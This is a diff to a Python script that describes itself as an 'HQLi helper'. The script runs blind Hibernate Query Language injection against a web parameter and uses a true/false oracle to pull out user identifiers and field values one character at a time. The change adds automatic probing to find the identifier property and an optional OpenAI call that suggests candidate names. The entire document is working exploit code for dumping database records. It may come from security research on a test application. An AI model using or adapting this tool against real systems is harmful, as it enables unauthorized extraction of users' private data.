@@ -32,6 +32,7 @@ SLEEP_BETWEEN = 0.0  # throttle if needed
 DEBUG = False
 AI_MODE = False
 AI_FIELD_COUNT = 10
+ID_FIELD = None
 
 
 def _lower_camel(s: str) -> str:
@@ -204,6 +205,120 @@ def is_unknown_property_error(field: str) -> bool:
         or "could not resolve attribute" in low
     )
 
+def _entity_simple_name() -> str:
+    return (HQL_ENTITY.split(".")[-1] if HQL_ENTITY else "").strip()
+
+def _id_candidates_base() -> list[str]:
+    sn = _entity_simple_name()
+    lc = sn[:1].lower() + sn[1:] if sn else sn
+    guess = []
+    if lc:
+        guess.extend([f"{lc}Id", f"{lc}Code"])  # e.g., agentId, agentCode
+    guess.extend([
+        "userId", "agentId", "customerId", "clientId", "accountId", "policyId",
+        "memberId", "employeeId", "username", "email", "code", "refId", "uid", "uuid", "guid",
+        "altUserId",
+        "id",  # HQL alias for identifier; keep last as fallback
+    ])
+    # Deduplicate preserving order
+    seen = set()
+    out = []
+    for g in guess:
+        if g not in seen:
+            seen.add(g)
+            out.append(g)
+    return out
+
+def _truthy_expr(expr: str):
+    return truthy(inj(expr))
+
+def _property_probe(prop: str) -> bool:
+    """Probe if property name parses on server. Returns False if unknown property error seen, True otherwise."""
+    # Use a tautology that references the property irrespective of null-ness
+    _ = _truthy_expr(exists(f"u.{prop} is null or u.{prop} is not null"))
+    return not is_unknown_property_error(prop)
+
+def _prop_duplicates_exist(prop: str):
+    # True means duplicates observed (not unique); False means likely unique or too few rows.
+    expr = f"exists ( from {HQL_ENTITY} a, {HQL_ENTITY} b where a <> b and a.{prop} = b.{prop} )"
+    return _truthy_expr(expr)
+
+def _augment_id_candidates_from_ai(count: int = 5) -> list[str]:
+    try:
+        api_key = os.environ.get("OPENAI_API_KEY")
+        if not api_key:
+            return []
+        entity_full_name = HQL_ENTITY
+        entity_simple = _entity_simple_name()
+        system_msg = "You output JSON only."
+        user_msg = (
+            f"Given an entity name, list up to {count} likely identifier property names as lowerCamelCase; "
+            "examples: userId, agentId, id, uuid. No explanations.\n"
+            f"Entity full name: {entity_full_name}\nEntity simple name: {entity_simple}"
+        )
+        url = "https://api.openai.com/v1/chat/completions"
+        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
+        payload = {
+            "model": "gpt-4o-mini",
+            "messages": [{"role": "system", "content": system_msg}, {"role": "user", "content": user_msg}],
+            "temperature": 0.2,
+            "max_tokens": 200,
+        }
+        resp = requests.post(url, headers=headers, json=payload, timeout=20)
+        if resp.status_code != 200:
+            return []
+        data = resp.json()
+        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or "[]"
+        try:
+            arr = json.loads(content)
+            if isinstance(arr, list):
+                raw = [str(x) for x in arr][:count]
+            else:
+                raw = []
+        except Exception:
+            raw = [p.strip() for p in re.split(r"[,\n]", content) if p.strip()]
+        cleaned = []
+        seen = set()
+        for x in raw:
+            nm = _sanitize_field_name(x)
+            if nm and nm not in seen:
+                seen.add(nm)
+                cleaned.append(nm)
+        return cleaned
+    except Exception:
+        return []
+
+def discover_id_field(cli_override = None) -> str:
+    global ID_FIELD
+    if cli_override:
+        ID_FIELD = cli_override
+        print(f"[*] id field (cli): {ID_FIELD}")
+        return ID_FIELD
+    candidates = _id_candidates_base()
+    if AI_MODE:
+        ai_sugs = _augment_id_candidates_from_ai(5)
+        # Prepend AI suggestions (higher priority), but keep order stable
+        candidates = [*ai_sugs, *[c for c in candidates if c not in ai_sugs]]
+    viable: list[str] = []
+    for c in candidates:
+        if _property_probe(c):
+            viable.append(c)
+    # Prefer unique-looking properties
+    chosen = None
+    for c in viable:
+        d = _prop_duplicates_exist(c)
+        if d is False:  # no duplicates observed
+            chosen = c
+            break
+    if not chosen and viable:
+        chosen = viable[0]
+    if not chosen:
+        # Fallback to HQL alias 'id'
+        chosen = "id"
+    ID_FIELD = chosen
+    print(f"[*] id field: {ID_FIELD}")
+    return ID_FIELD
+
 def do_request(agent: str):
     params = {"agentCode": agent}
     r = requests.get(URL, params=params, headers=HEADERS,
@@ -248,7 +363,8 @@ def oracle_ok() -> bool:
 # Phase 1: enumerate userIds
 # =======================
 def prefix_is_user(prefix: str, extra_where: str = "1=1"):
-    return truthy(inj(exists(f"{extra_where} and u.userId like '{esc(prefix)}%'")))
+    field = ID_FIELD or "id"
+    return truthy(inj(exists(f"{extra_where} and u.{field} like '{esc(prefix)}%'")))
 
 def recover_one_userid(extra_where: str = "1=1"):
     # ensure any row is visible under this filter
@@ -260,7 +376,7 @@ def recover_one_userid(extra_where: str = "1=1"):
         for c in USERID_CHARSET:
             if prefix_is_user(prefix + c, extra_where):
                 prefix += c
-                print(f"[userId] pos {pos:02d}: {prefix}")
+                print(f"[id:{ID_FIELD or 'id'}] pos {pos:02d}: {prefix}")
                 advanced = True
                 break
         if not advanced:
@@ -274,27 +390,31 @@ def enumerate_userids(target_count: int) -> list[str]:
         uid = recover_one_userid(extra_where=extra)
         if not uid:
             break
-        print(f"[result] userId: {uid}")
+        print(f"[result] {ID_FIELD or 'id'}: {uid}")
         found.append(uid)
         # Exclude recovered IDs to get the next
-        not_equals = " and ".join([f"u.userId <> '{esc(x)}'" for x in found])
+        field = ID_FIELD or "id"
+        not_equals = " and ".join([f"u.{field} <> '{esc(x)}'" for x in found])
         extra = f"({not_equals})"
-    print(f"[done] recovered {len(found)} userId(s): {found}")
+    print(f"[done] recovered {len(found)} id(s): {found}")
     return found
 
 # =======================
 # Phase 2–3: fields & values
 # =======================
 def field_not_null(user_id: str, field: str):
-    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null"
+    idf = ID_FIELD or "id"
+    where = f"u.{idf} = '{esc(user_id)}' and u.{field} is not null"
     return truthy(inj(exists(where)))
 
 def has_len_at_least(user_id: str, field: str, n: int):
-    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null and length(u.{field}) >= {n}"
+    idf = ID_FIELD or "id"
+    where = f"u.{idf} = '{esc(user_id)}' and u.{field} is not null and length(u.{field}) >= {n}"
     return truthy(inj(exists(where)))
 
 def prefix_is(user_id: str, field: str, prefix: str):
-    where = f"u.userId = '{esc(user_id)}' and u.{field} like '{esc(prefix)}%'"
+    idf = ID_FIELD or "id"
+    where = f"u.{idf} = '{esc(user_id)}' and u.{field} like '{esc(prefix)}%'"
     return truthy(inj(exists(where)))
 
 def recover_field(user_id: str, field: str, maxlen: int):
@@ -342,7 +462,7 @@ def recover_field(user_id: str, field: str, maxlen: int):
 def discover_and_dump_fields(user_ids: list[str]):
     results = []
     for uid in user_ids:
-        print(f"\n===== Enumerating fields for userId {uid} =====")
+        print(f"\n===== Enumerating fields for {ID_FIELD or 'id'} {uid} =====")
         for field in FIELDS:
             maxlen = FIELD_MAXLEN.get(field, DEFAULT_MAXLEN)
             value = recover_field(uid, field, maxlen)
@@ -359,7 +479,7 @@ def discover_and_dump_fields(user_ids: list[str]):
 # Main
 # =======================
 def main():
-    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT
+    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT, ID_FIELD
     parser = argparse.ArgumentParser(description="HQLi helper")
     parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
     parser.add_argument("--entity", required=True, help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
@@ -367,6 +487,7 @@ def main():
     parser.add_argument("--fields", required=True, help="Path to a wordlist file of field names to try (one per line)")
     parser.add_argument("--ai-field-count", type=int, default=10, help="How many fields to fetch from OpenAI when --ai-mode is enabled (default: 10)")
     parser.add_argument("--entity-count", type=int, default=2, help="Total number of entities to enumerate (default: 2)")
+    parser.add_argument("--id-field", help="Override: name of the identifier property (e.g., userId, agentId). If omitted, the script tries to discover it.")
     args = parser.parse_args()
     DEBUG = args.debug
     HQL_ENTITY = args.entity
@@ -380,6 +501,8 @@ def main():
     if AI_MODE:
         augment_fields_from_ai(HQL_ENTITY, AI_FIELD_COUNT)
 
+    # Determine identifier field before oracle probes/enumeration
+    discover_id_field(args.id_field)
     oracle_ok()
     user_ids = enumerate_userids(TARGET_ENTITY_COUNT)
     if not user_ids:
